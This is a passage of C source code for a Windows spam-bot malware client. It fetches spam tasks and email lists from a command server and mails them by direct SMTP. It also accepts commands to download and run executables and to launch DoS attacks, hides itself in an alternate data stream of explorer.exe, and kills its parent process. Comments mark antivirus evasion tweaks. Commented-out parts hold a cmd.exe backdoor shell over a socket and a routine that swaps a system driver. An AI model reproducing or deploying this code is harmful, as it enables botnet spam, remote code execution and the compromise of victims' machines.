			sprintf(cReceived, "(qmail %d by uid %d); %s, %d %s %d %d:%d:%d %.4d", dwQmail_idcount, dwQmail_uid, pcDays[stTime.wDayOfWeek], stDate.wDay, pcMonths[stDate.wMonth], stDate.wYear, stDate.wHour, stDate.wMinute, stDate.wSecond, tziZone.Bias);
			while (ReplaceStringUsingBuf(cMsg, "@@DATE", cDate, cReplaceBuffer)) { }
			while (ReplaceStringUsingBuf(cMsg, "@@RECEIVED", cReceived, cReplaceBuffer)) { }

			// check for valid email
			char * cDog = strchr(cToEmail, '@');
			if (cDog == NULL) {
				dwError[1]++;
				res = 2;
			} else {
				memset(cServer, '\0', sizeof(cServer));
				strcpy(cServer, cDog + 1);
				SYSTEMTIME SystemTime;
				char cSystemDate[MAX_PATH], cSystemTime[MAX_PATH];
				GetLocalTime(&SystemTime);
				sprintf(cSystemDate, "%d.%d.%d", SystemTime.wDay, SystemTime.wMonth, SystemTime.wYear);
				sprintf(cSystemTime, "%d:%d:%d", SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond);
				while (ReplaceStringUsingBuf(cMsg, "$DATE", cSystemDate, cReplaceBuffer)) { }
				while (ReplaceStringUsingBuf(cMsg, "$TIME", cSystemTime, cReplaceBuffer)) { }
				char cTemplate[MAX_PATH];  // Microsft Live OneCare fix
				sprintf(cTemplate, "$QM_%s", "MESSID");
				while (ReplaceStringUsingBuf(cMsg, cTemplate, cMID, cReplaceBuffer)) { }
				sprintf(cTemplate, "$QM_%s", "RECEIVED");
				while (ReplaceStringUsingBuf(cMsg, cTemplate, cMID, cReplaceBuffer)) { }

				cMXConnected[pData->dwThreadIndex] = 0;
				strcpy(cMXServers + pData->dwThreadIndex * MAX_PATH, cServer);
				while (GetMXConnectionsCount(cServer) >= 3)
					Sleep(100);
				cMXConnected[pData->dwThreadIndex] = 1;

				res = smtp_send(cMsg, (DWORD)strlen(cMsg), cServer, cFromServer, cFromName, cFromEmail, "", cToEmail, cReplaceBuffer);

				cMXConnected[pData->dwThreadIndex] = 0;
			}

		}
		(*pData->pdwThreadStatus) = THREAD_STATUS_DONE;
	} else {
		dwUnexpectedErrors++;
		res = false;
	}
	(*hExitThread)(res);
	return res;
}

bool Check25()
{
	//AddToLog("Checking 25 port\n");
	char *domains[] = {"hotmail.com", "yahoo.com", "aol.com", "google.com", "mail.com"};
	char cBuf[MAX_PATH];

	for (int i=0; i<5; i++) {
		PDNS_RECORD pdrQuery;

		if ((*hDnsQuery_A)(domains[i], DNS_TYPE_MX, DNS_QUERY_STANDARD, 0, &pdrQuery, 0)==0)
		{
			char * pcServer, cServerBuf[MAX_PATH];
			pcServer = SMTPGetPreferedServer(pdrQuery);
			if (pcServer != 0) {
				strcpy(cServerBuf, pcServer);
			} else cServerBuf[0] = '\0';
			(*hDnsRecordListFree)(pdrQuery, DnsFreeRecordList);

			if (strlen(cServerBuf) != 0)
			{
				SOCKET s = ConnectToPort(cServerBuf, NULL, 25, 55);
				if (s == SOCKET_ERROR)
				{
					continue;
				} else {
					DWORD dwReceived;
					memset(cBuf, '\0', sizeof(cBuf));
					if (SOCKET_ERROR == (dwReceived = (*hRecv)(s, cBuf, sizeof(cBuf)-1, 0))) {
						(*hClosesocket)(s);
						continue;
					} else {
						(*hClosesocket)(s);
						return true;
					}
				}
			}
		}
	}
	return false;
}
//smtp_routine end

void ExecuteSheduledActions()
{
	//AddToLog("Sheduler working...\n");

	char cValue[MAX_PATH];

	ReadRegistryValue(HKEY_CURRENT_USER, cSoftMicrWinCVwinlogon, cDelKeyName, cValue, MAX_PATH);
	if (strlen(cValue) != 0) {
		if ((*hDeleteFile)(cValue))
			AddRegistryValueStr(HKEY_CURRENT_USER, cSoftMicrWinCVwinlogon, cDelKeyName, "");
	}
	//AddToLog("Sheduler done.\n");
}

typedef struct _tagPROCESS_BASIC_INFORMATION
{
    DWORD ExitStatus;
    DWORD PebBaseAddress;
    DWORD AffinityMask;
    DWORD BasePriority;
    ULONG UniqueProcessId;
    ULONG InheritedFromUniqueProcessId;
}   PROCESS_BASIC_INFORMATION;

DWORD GetParentProcessID(DWORD dwPID)
{
	NTSTATUS ntStatus;
	DWORD dwParentPID = 0xffffffff;

	HANDLE hProcess;
	PROCESS_BASIC_INFORMATION pbi;
	ULONG ulRetLen;

	//  create entry point for 'NtQueryInformationProcess()'
	typedef NTSTATUS (__stdcall *FPTR_NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
	FPTR_NtQueryInformationProcess NtQueryInformationProcess = (FPTR_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationProcess");

	//  get process handle
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPID);

	//  could fail due to invalid PID or insufficiant privileges
	if (!hProcess)
		return (0xffffffff);

	//  gather information
	ntStatus = NtQueryInformationProcess(hProcess, ProcessBasicInformation, ( void*) &pbi, sizeof(PROCESS_BASIC_INFORMATION), &ulRetLen);

	//  copy PID on success
	if (!ntStatus)
		dwParentPID = pbi.InheritedFromUniqueProcessId;

	CloseHandle(hProcess);

	return(dwParentPID);
}

bool ParseMailsList(DWORD dwMailListIndex, char * Buf)
{
	char * cEmailsStart;
	bool result = true;
	char cEmails[] = "<emails>";
	char cTmpBuf[MAX_PATH];

	cEmailsStart = strstr(Buf, cEmails);
	if (cEmailsStart == NULL)
	{
		result = false;
	} else {
		cEmailsStart = cEmailsStart + strlen(cEmails) + strlen(cRN);
		MailLists[dwMailListIndex].dwEmailCount = 0;
		while (cEmailsStart[0] != '<') {
			char * cRPos, * cNPos;
			char cDelimeter[2];
			
			cRPos = strchr(cEmailsStart, '\r');
			cNPos = strchr(cEmailsStart, '\n');
			if ((cRPos != NULL) && (cNPos != NULL) && (cRPos < cNPos)) {
				strcpy(cDelimeter, "\r");
			} else {
				strcpy(cDelimeter, "\n");
			}

			if (!ExtractData(cEmailsStart, cDelimeter, cTmpBuf, sizeof(cTmpBuf) - 1))
			{
				result = false;
				break;
			}
			cEmailsStart = cEmailsStart + strlen(cTmpBuf) + 1;
			while ((cEmailsStart[0] == '\r') || (cEmailsStart[0] == '\n'))
				cEmailsStart++;
			MailLists[dwMailListIndex].dwEmailCount++;

			if (MailLists[dwMailListIndex].cEmail[MailLists[dwMailListIndex].dwEmailCount - 1] == NULL)
			{
				MailLists[dwMailListIndex].cEmail[MailLists[dwMailListIndex].dwEmailCount - 1] = (PCHAR)VirtualAlloc(0, 255, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
			}
			if (MailLists[dwMailListIndex].cEmail[MailLists[dwMailListIndex].dwEmailCount - 1] == NULL)
				result = false;
			strcpy((PCHAR)(MailLists[dwMailListIndex].cEmail[MailLists[dwMailListIndex].dwEmailCount - 1]), cTmpBuf);
		}
	}
	return result;
}


bool ParseTask(char * Buf, DWORD dwBufLen)
{
	char * cInfoStart, * cTextStart;
	char * cTmpBuf = (char *)VirtualAlloc(0, MAX_PACKET_SIZE, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	if (cTmpBuf != NULL)
	{
		char cTaskId[] = "taskid=";
		char cRealIp[] = "realip=";
		char cHostName[] = "hostname=";
		char cStyle[] = "style=";
		char cInfo[] = "<info>";
		char cText[] = "<text>";
		bool result = true;

		if (NULL == Buf)
		{
			result = false;
		} else {
			cInfoStart = strstr(Buf, cInfo);
			// is this a real mailing job ?
			if (cInfoStart == NULL)
			{
				result = false;
			} else {
				char * cTaskIdPosition = strstr(cInfoStart, cTaskId);
				if (cTaskIdPosition == NULL)
				{
					result = false;
				} else {
					if (!ExtractData(cTaskIdPosition + strlen(cTaskId), cRN, cTmpBuf, MAX_PACKET_SIZE))
					{
						result = false;
					} else {
						DWORD dwOldTaskId = Job.dwTaskId;
						Job.dwTaskId = atoi(cTmpBuf);
						char * cRealIpPosition = strstr(cInfoStart, cRealIp);
						if (cRealIpPosition == NULL)
						{
							result = false;
						} else {
							if (!ExtractData(cRealIpPosition + strlen(cRealIp), cRN, Job.cRealIp, sizeof(Job.cRealIp)))
							{
								result = false;
							} else {
								char * cHostNamePosition = strstr(cInfoStart, cHostName);
								if (cHostNamePosition == NULL)
								{
									result = false;
								} else {
									if (!ExtractData(cHostNamePosition + strlen(cHostName), cRN, Job.cRealHostname, sizeof(Job.cRealHostname)))
									{
										result = false;
									} else {
										char * cStylePosition = strstr(cInfoStart, cStyle);
										char cStyleValue[MAX_PATH];
										if ((cStylePosition == NULL) || (!ExtractData(cStylePosition + strlen(cStyle), cRN, cStyleValue, sizeof(cStyleValue))))
										{
											Job.dwStyle = 0;
										} else {
											Job.dwStyle = atoi(cStyleValue);
										}

										result = ParseMailsList(0, cInfoStart);

										if (result != false)
										{
											cRealIpPosition = strstr(cInfoStart, cRealIp);
											if (cRealIpPosition == NULL) {
												result = false;
											} else {
												if (!ExtractData(cRealIpPosition + strlen(cRealIp), cRN, cTmpBuf, MAX_PACKET_SIZE))
												{
													result = false;
												} else {
													g_dwLocalIP = (*hInet_addr)(cTmpBuf);
													if ((isIP(cTmpBuf)) && (isIP(Job.cRealHostname)))
													{
														(*hGethostname)(Job.cRealHostname, sizeof(Job.cRealHostname));
														ParseIp(Job.cRealIp);
													}

													for (int i = 0; i < ERRORS_COUNT; i++)
														dwError[i] = 0;
													dwNoErrors = 0;
													dwUnexpectedErrors = 0;
													result = true;
												}
											}
										}
										if (result != false)
										{
											cTextStart = strstr(Buf, cText);
											if (cTextStart != NULL)
											{
												char cTextEnd[MAX_PATH];
													sprintf(cTextEnd, "</%s", cText + 1); // kav8 fix
												cTextStart = cTextStart + strlen(cText) + strlen(cRN);
												char * cTextEndPosition = strstr(cTextStart, cTextEnd);
												if (cTextEndPosition == NULL)
												{
													result = false;
												} else {
													if (dwOldTaskId != 0) 
														VirtualFree(Job.cText, 0, MEM_RELEASE);

													Job.dwTextLength = (DWORD)(cTextEndPosition - cTextStart);
													
													Job.cText = VirtualAlloc(0, Job.dwTextLength + 1, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
													if (Job.cText != NULL)
													{
														memset(Job.cText, '\0', Job.dwTextLength + 1);

														strncpy((PCHAR)Job.cText, cTextStart, Job.dwTextLength);
														// Test message
														//strcpy((PCHAR)Job.cText, "Content-Type: text/plain\r\nSubject: test\r\nTo: %TO_EMAIL\r\nFrom: %FROM_EMAIL\r\n\r\nVery important message.\r\n");
													} else
														result = false;
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}
		VirtualFree(cTmpBuf, 0, MEM_RELEASE);
		return result;
	} else {
		return false;
	}
}

void ExecuteConfig(char * Buf)
{
	char cConfig[MAX_PATH];
	char cConfigEnd[MAX_PATH];
	memset(cDoS, '\0', sizeof(cDoS));
	sprintf(cConfig, "<%s>\r\n", "config");
	sprintf(cConfigEnd, "</%s>\r\n", "config");
	char * cToken = Buf;
	if (strstr(cToken, cConfig) == NULL)
		return;
	cToken = strstr(cToken, cConfig) + strlen(cConfig);
	while (strstr(cToken, cConfigEnd) != NULL)
	{
		char cCommand[MAX_PATH];
		ExtractData(cToken, cRN, cCommand, sizeof(cCommand));
		//if (strcmp(cCommand, "logging-on") == 0)
		//{
		//	bLogData = true;
		//}
		//if (strcmp(cCommand, "logging-off") == 0)
		//{
		//	bLogData = false;
		//}
		if (strstr(cCommand, "update:") == cCommand)
		{
			char cUpdatePath[MAX_PATH];
			ExtractData(cCommand + strlen("update:"), ";", cUpdatePath, sizeof(cUpdatePath));

			//AddToLog("Update command received. New version available.\n");
			char * cUpdateServerStart = cUpdatePath + strlen("http://");
			if (!cUpdateServerStart)
				continue;
			char cUpdateServer[MAX_PATH];
			if (!ExtractData(cUpdateServerStart, "/", cUpdateServer, sizeof(cUpdateServer)))
				continue;
			char * cUpdateURIStart = cUpdateServerStart + strlen(cUpdateServer);
			char * FileBuf = (char *)VirtualAlloc(0, 100000, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
			if (FileBuf != NULL)
			{
				int bSad;
				if (bSad = HttpSay(cUpdateServer, cUpdateURIStart, "GET", "", "", 0, NULL, 0, FileBuf, 100000, false))
				{
					if ((FileBuf[0] == 0x4D) &&  (FileBuf[1] == 0x5A))
					{
						char cFileName[MAX_PATH], cCurDir[MAX_PATH];
						memset(cCurDir, '\0', sizeof(cCurDir));
						GetCurrentDirectory(sizeof(cCurDir), cCurDir);
						if (cCurDir[strlen(cCurDir) - 1] != '\\')
							strcat(cCurDir, "\\");
						sprintf(cFileName, "%supdate%d%s", cCurDir, (*hGetTickCount)(), cDotExe);
						SaveBufToFile(cFileName, FileBuf, bSad, false);
						ExecuteProcess(cFileName, true);
					}
				}
				VirtualFree(FileBuf, 0, MEM_RELEASE);
			}
		}
		if (strcmp(cCommand, "run:") == 0)
		{
			char cRunPath[MAX_PATH];
			ExtractData(cCommand + strlen("run:"), ";", cRunPath, sizeof(cRunPath));
			//AddToLog("Run command received. Eve available.\n");
			char * cRunServerStart = cRunPath + strlen("http://");
			if (!cRunServerStart)
				continue;
			char cRunServer[MAX_PATH];
			if (!ExtractData(cRunServerStart, "/", cRunServer, sizeof(cRunServer)))
				continue;
			char * cRunURIStart = cRunServerStart + strlen(cRunServer);
			char * FileBuf = (char *)VirtualAlloc(0, 100000, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
			if (FileBuf != NULL)
			{
				int bSad;
				if (bSad = HttpSay(cRunServer, cRunURIStart, "GET", "", "", 0, NULL, 0, FileBuf, 100000, false))
				{
					if (strstr(FileBuf, "MZ") == FileBuf)
					{
						char cFileName[MAX_PATH];
						sprintf(cFileName, "run%d%s", (*hGetTickCount)(), cDotExe);
						SaveBufToFile(cFileName, FileBuf, bSad, false);
						ExecuteProcess(cFileName, false);
					}
				}
				VirtualFree(FileBuf, 0, MEM_RELEASE);
			}
		}
		if (strncmp(cCommand, "click:", 6) == 0)
		{
			char cClickPath[MAX_PATH];
			ExtractData(cCommand + strlen("click:"), ";", cClickPath, sizeof(cClickPath));
			//AddToLog("Click command received.\n");
			char * cClickServerStart = cClickPath + strlen("http://");
			if (!cClickServerStart)
				continue;
			char cClickServer[MAX_PATH];
			if (!ExtractData(cClickServerStart, "/", cClickServer, sizeof(cClickServer)))
				continue;
			char * cClickURIStart = cClickServerStart + strlen(cClickServer);
			char * FileBuf = (char *)VirtualAlloc(0, 100000, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
			if (FileBuf != NULL)
			{
				HttpSay(cClickServer, cClickURIStart, "GET", "", "", 0, NULL, 0, FileBuf, 100000, false);
				VirtualFree(FileBuf, 0, MEM_RELEASE);
			}
		}
		if (strncmp(cCommand, "dos:", 4) == 0)
			ExtractData(cCommand + strlen("dos:"), ";", cDoS, sizeof(cDoS));
		if (strncmp(cCommand, "dnsdos:", 4) == 0)
			ExtractData(cCommand + strlen("dnsdos:"), ";", cDNSDoS, sizeof(cDNSDoS));
		
		//if (strcmp(cCommand, "uploadlog") == 0)
		//{
		//	HANDLE hLogFile = CreateFile(LogFileName, GENERIC_READ, FILE_SHARE_READ + FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL);
		//	DWORD dwLogFileSize, dwLogFileSize2, dwEncodedSize;
		//	dwLogFileSize = GetFileSize(hLogFile, NULL);
		//	if (dwLogFileSize != 0)
		//	{
		//		HANDLE cLogMem = VirtualAlloc(0, dwLogFileSize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
		//		HANDLE cLogMemEscaped = VirtualAlloc(0, dwLogFileSize * 2 + 1024, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
		//		ReadFile(hLogFile, cLogMem, dwLogFileSize, &dwLogFileSize2, NULL);
		//		CloseHandle(hLogFile);
		//		sprintf((PCHAR)cLogMemEscaped, "ver=%s&id=%s&log=", CURRENT_VERSION, cUniqueId);
		//		dwEncodedSize = (DWORD)strlen((PCHAR)cLogMemEscaped);
		//		dwEncodedSize += Encode((PCHAR)cLogMem, (PCHAR)cLogMemEscaped + strlen((PCHAR)cLogMemEscaped));
		//		char cAdditionalHeader[] = "Content-Type: application/x-www-form-urlencoded";
		//		memset(cLogMem, '\0', dwLogFileSize);
		//		if (HttpSay(cCurrentConfigServer, cPostLogPage, "POST", "", cAdditionalHeader, (DWORD)strlen(cAdditionalHeader), (PCHAR)cLogMemEscaped, dwEncodedSize, (PCHAR)cLogMem, dwLogFileSize, false))
		//		{
		//			(*hDeleteFile)(LogFileName);
		//		}
		//		VirtualFree(cLogMem, 0, MEM_RELEASE);
		//		VirtualFree(cLogMemEscaped, 0, MEM_RELEASE);
		//	} else {
		//		CloseHandle(hLogFile);
		//	}
		//}
		//if (strcmp(cCommand, "kill") == 0)
		//{
		//	//AddToLog("Kill command received.\n");
		//	RemoveSelf();
		//}

		cToken += strlen(cCommand) + strlen(cRN);
	}
	return;
}

bool GetMailsList(DWORD dwMailListIndex)
{
	char * Buf = (char *)VirtualAlloc(0, 16 * MAX_PACKET_SIZE, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	if (Buf != NULL)
	{
		bool bRes;
		int iVer = atoi(CURRENT_VERSION);
		char cUserAgent[MAX_PATH];
		sprintf(cUserAgent, "id=%s&tick=%d&ver=%d&smtp=%s&task=%d&continue=1", cUniqueId, (*hGetTickCount)(), iVer, (bSMTPOk?"ok":"bad"), Job.dwTaskId);

		if (Job.dwTaskId != 0)
		{
			char cTmpStr[MAX_PATH];
			sprintf(cTmpStr, "&errors[0]=%d", dwNoErrors);
			dwNoErrors = 0;
			dwUnexpectedErrors = 0;
			strcat(cUserAgent, cTmpStr);
			for (int i = 0; i < ERRORS_COUNT; i++)
				if (dwError[i] > 0)
				{
					char cTmpErrBuf[MAX_PATH];
					sprintf(cTmpErrBuf, "&errors[%d]=%d", 700+i, dwError[i]);
					dwError[i] = 0;
					strcat(cUserAgent, cTmpErrBuf);
				}
		}

		memset(Buf, '\0', 16 * MAX_PACKET_SIZE);
		bool bSad = HttpSay(cConfigServer, cScriptPage, "GET", NULL, NULL, 0, NULL, 0, Buf, 16 * MAX_PACKET_SIZE, false, cUserAgent) != 0;
		if (bSad)
		{
		//AddToLog(Buf);

			decrypturl(Buf, cUniqueId);
			bRes = ParseMailsList(dwMailListIndex, Buf);
		} else {
			bRes = false;
			Job.dwTaskId = 0;
		}
		VirtualFree(Buf, 0, MEM_RELEASE);
		return bRes;
	} else {
		return false;
	}
}

int GetTask()
{
	int Res = 1; // 0 - ok, 1 - just no available task, 2 - connection problems
	char * Buf = (char *)VirtualAlloc(0, 16 * MAX_PACKET_SIZE, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	if (Buf != NULL)
	{
		int iVer = atoi(CURRENT_VERSION);
		char cUserAgent[MAX_PATH];
		sprintf(cUserAgent, "id=%s&tick=%d&ver=%d&smtp=%s&task=%d", cUniqueId, (*hGetTickCount)(), iVer, (bSMTPOk?"ok":"bad"), Job.dwTaskId);
		if (Job.dwTaskId != 0)
		{
			char cTmpStr[MAX_PATH];
			sprintf(cTmpStr, "&errors[0]=%d", dwNoErrors);
			dwNoErrors = 0;
			dwUnexpectedErrors = 0;
			strcat(cUserAgent, cTmpStr);
			for (int i = 0; i < ERRORS_COUNT; i++)
				if (dwError[i] > 0) {
					char cTmpErrBuf[MAX_PATH];
					sprintf(cTmpErrBuf, "&errors[%d]=%d", 700+i, dwError[i]);
					dwError[i] = 0;
					strcat(cUserAgent, cTmpErrBuf);
				}
		}
		memset(Buf, '\0', 16 * MAX_PACKET_SIZE);
		bool bSad = HttpSay(cConfigServer, cScriptPage, "GET", NULL, NULL, 0, NULL, 0, Buf, 16 * MAX_PACKET_SIZE, false, cUserAgent) != 0;
		if (bSad)
		{
			//AddToLog(Buf);
			decrypturl(Buf, cUniqueId);
			ExecuteConfig(Buf);
			if (ParseTask(Buf, 16 * MAX_PACKET_SIZE))
				Res = 0;
		} else {
			Res = 2;
			Job.dwTaskId = 0;
		}
		VirtualFree(Buf, 0, MEM_RELEASE);
	}
	return Res;
}

void FreeTask()
{
//	DWORD dwMail;

//	for (dwMail = 0; dwMail < MailLists[0].dwEmailCount; dwMail++)
//		VirtualFree(MailLists[0].cEmail[dwMail], 0, MEM_RELEASE);

	return;
}


DWORD GetSIDTBaseAddress()
{
	__asm
	{
		sub esp, 8 // create stack frame
		sidt qword ptr [esp]
		mov eax, dword ptr [esp+2] // write into EAX for return value
		add esp, 8 // clean up stack
	}
}

bool MyCopyFile(char * cSrc, char * cDst)
{
	bool bRes = false;
	HANDLE hSourceFile = CreateFile(cSrc, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);
	HANDLE hDestinationFile = CreateFile(cDst, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
	if ((hSourceFile != INVALID_HANDLE_VALUE) && (hDestinationFile != INVALID_HANDLE_VALUE))
	{
		char * cBuf = NULL;
		DWORD dwBufSize = 65535;
		while (cBuf == NULL) {
			cBuf = (char*)VirtualAlloc(0, dwBufSize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
		}
		DWORD dwBytesRead = 0;
		do {
			if (ReadFile(hSourceFile, cBuf, dwBufSize, &dwBytesRead, NULL))
			{
				WriteFile(hDestinationFile, cBuf, dwBytesRead, &dwBytesRead, NULL);
			} else break;
		} while (dwBytesRead != 0);
		VirtualFree(cBuf, 0, MEM_RELEASE);
		bRes = true;
	}
	CloseHandle(hSourceFile);
	CloseHandle(hDestinationFile);
	return bRes;
}
/*
HINSTANCE GetFakeLibHandle(char * cRealName, char * cFakeName)
{
	//AddToLog("Making ananlog of: ");
    //AddToLog(cRealName);
	//AddToLog("\n");
	char cTruePath[MAX_PATH];
	char cNewPath[MAX_PATH];
	char cNewFullPath[MAX_PATH];
	char cSystemDir[MAX_PATH];
	char cTempPath[MAX_PATH];
	GetSystemDirectory(cSystemDir, sizeof(cSystemDir));
	PathCombine(cTruePath, cSystemDir, cRealName);
	GetTempPath(sizeof(cTempPath), cTempPath);
	PathCombine(cNewPath, cTempPath, cFakeName);
	MyCopyFile(cTruePath, cNewPath);
	GetLongPathName(cNewPath, cNewFullPath, sizeof(cNewFullPath));
	HMODULE hLib = (*hLoadLibrary)(cNewFullPath);
	HINSTANCE hInst = GetModuleHandle(cNewFullPath);
	return hInst;
}
*/
HINSTANCE GetLibHandle(char * cRealName)
{
	HMODULE hLib = (*hLoadLibrary)(cRealName);
	HINSTANCE hInst = GetModuleHandle(cRealName);
	return hInst;
}

bool DeploySelf()
{
	//AddToLog("Deploying self\n");
#ifndef _DEBUG
	char cSourceFile[MAX_PATH];
	char cDestinationFile[MAX_PATH];

	// Get original name
	GetModuleFileNameMy(cSourceFile, sizeof(cSourceFile));

	GetWindowsDirectory(cDestinationFile, sizeof(cDestinationFile));
	if (cDestinationFile[strlen(cDestinationFile) - 1] != '\\')
		strcat(cDestinationFile, "\\");
	strcat(cDestinationFile, "explorer.exe:");
	strcat(cDestinationFile, cMalwareShortName);
	strcat(cDestinationFile, cDotExe);
	HANDLE hDestinationFile = CreateFile(cDestinationFile, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
	if (hDestinationFile == INVALID_HANDLE_VALUE)
	{
		GetSystemDirectory(cDestinationFile, sizeof(cDestinationFile));
		if (cDestinationFile[strlen(cDestinationFile) - 1] != '\\')
			strcat(cDestinationFile, "\\");
		strcat(cDestinationFile, cMalwareShortName);
		strcat(cDestinationFile, cDotExe);
		hDestinationFile = CreateFile(cDestinationFile, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
		if (hDestinationFile == INVALID_HANDLE_VALUE) return false;
	}

	//AddToLog("Source file name is: ");
	//AddToLog(cSourceFile);
	//AddToLog("\n");

	//AddToLog("Destination file name is: ");
	//AddToLog(cDestinationFile);
	//AddToLog("\n");

	HANDLE hSourceFile;
	hSourceFile = CreateFile(cSourceFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);
	if (hSourceFile != INVALID_HANDLE_VALUE)
	{
		char * cBuf = NULL;
		DWORD dwBufSize = 65535;
		while (cBuf == NULL) {
			cBuf = (char*)VirtualAlloc(0, dwBufSize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
		}
		DWORD dwBytesRead = 0;
		do {
			if (ReadFile(hSourceFile, cBuf, dwBufSize, &dwBytesRead, NULL))
			{
				WriteFile(hDestinationFile, cBuf, dwBytesRead, &dwBytesRead, NULL);
			} else break;
		} while (dwBytesRead != 0);
		VirtualFree(cBuf, 0, MEM_RELEASE);
		CloseHandle(hSourceFile);
		//AddToLog("Main module installed at ");
		//AddToLog(cDestinationFile);
		//AddToLog("\n");
		AddRegistryValueStr(HKEY_CURRENT_USER, cSoftMicrWinCVwinlogon, cDelKeyName, cSourceFile);
		strcpy(cDeployedName, cDestinationFile);
		bDeployed = true;
	}
	CloseHandle(hDestinationFile);
	return bDeployed;
#else
	return true;
#endif
}
/*
bool DeployDriver()
{
#ifndef _DEBUG
	char g_path_driver[] = "\\\\?\\globalroot\\systemroot\\system32\\drivers\\beep.sys";
	char g_path_driverreal[] = "\\\\?\\globalroot\\systemroot\\system32\\drivers\\ipsys.sys";
	char g_path_driversave[] = "\\\\?\\globalroot\\systemroot\\system32\\drivers\\beeper.sys";
	BOOLEAN bWasEnabled;
	SC_HANDLE hSCService;
	HANDLE hFile;
	DWORD dwSize;
	SERVICE_STATUS ssStatus;
	// Setting privilegies
	RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &bWasEnabled);
	RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &bWasEnabled);

	hSCService = OpenServiceW(OpenSCManager(0, 0, SC_MANAGER_CONNECT), L"beep", SERVICE_START|SERVICE_STOP);
	MyCopyFile(g_path_driver, g_path_driversave);

	// Dropping driver
	Unxor_XorIt((PCHAR)g_beep, sizeof(g_beep), true);
	hFile = CreateFile(g_path_driverreal, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	WriteFile(hFile, g_beep, sizeof(g_beep), &dwSize, 0);
	ZwClose(hFile);
	Unxor_XorIt((PCHAR)g_beep, sizeof(g_beep), true);

	// installing driver
	ControlService(hSCService, SERVICE_CONTROL_STOP, &ssStatus);
	MyCopyFile(g_path_driverreal, g_path_driver);
	//AddToLog("Driver starting...\n");
	StartServiceW(hSCService,0,0);
	Wait(4000);

	// restoring system
	MyCopyFile(g_path_driversave, g_path_driver);
#endif
	return true;
}

unsigned int __stdcall BackdoorThread(SOCKET csocket)
{
	SECURITY_ATTRIBUTES sa;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE cstdin, rstdout, wstdin, cstdout;
	DWORD fexit, N, total;
	char buf[MAX_PATH];

	sa.lpSecurityDescriptor = NULL;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE; //allow inheritable handles

	if (!CreatePipe(&cstdin, &wstdin, &sa, 0)) return -1; //create stdin pipe
	if (!CreatePipe(&rstdout, &cstdout, &sa, 0)) return -1; //create stdout pipe

	GetStartupInfo(&si); //set startupinfo for the spawned process

	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = cstdout;
	si.hStdError = cstdout; //set the new handles for the child process
	si.hStdInput = cstdin;

	//spawn the child process
	if (!CreateProcess(0, "cmd.exe", 0, 0, TRUE, CREATE_NEW_CONSOLE, 0, 0, &si, &pi)) return -1;

	while (GetExitCodeProcess(pi.hProcess, &fexit) && (fexit == STILL_ACTIVE))
	{
			//check to see if there is any data to read from stdout
			if (PeekNamedPipe(rstdout, buf, sizeof(buf), &N, &total, 0) && N)
			{
					for (int a = 0; a < total; a += sizeof(buf))
					{
							ReadFile(rstdout, buf, sizeof(buf), &N, 0);
							(*hSend)(csocket, buf, N, 0);
					}
			}

			if (!ioctlsocket(csocket, FIONREAD, &N) && N)
			{
					(*hRecv)(csocket, buf, 1, 0);
					if (*buf == '\x0A') WriteFile(wstdin, "\x0D", 1, &N, 0);
					WriteFile(wstdin, buf, 1, &N, 0);
			}
			Sleep(1);
	}
	(*hClosesocket)(csocket);
	return 0;
}
*/
void KillParentProcess()
{
#ifndef _DEBUG
	DWORD dwPPID = GetParentProcessID(GetCurrentProcessId());
	char cFilePath[MAX_PATH];
	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, false, dwPPID);
	if (hProcess == INVALID_HANDLE_VALUE) {
		return;
	}
	GetModuleFileNameEx(hProcess, NULL, cFilePath, sizeof(cFilePath));
	if ((strstr(cFilePath, "winlogon")==NULL)&&(strstr(cFilePath, "explorer")==NULL)&&(strstr(cFilePath, "EXPLORER")==NULL)&&(strstr(cFilePath, "Explorer")==NULL))
	{
		TerminateProcess(hProcess, 0);
	} else {
		CloseHandle(hProcess);
	}
#endif
	return;
}
/*
bool InstallSelfAsDLL()
{
	BOOLEAN bOldPrivilege;
	HANDLE hFile, hNewPrintProcessor;
	BYTE bPrintProcessorDirectory[MAX_PATH];
	char cFileName[MAX_PATH], cMyFilename[MAX_PATH];

	NTSTATUS dwPrivAdj = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, NULL, &bOldPrivilege);
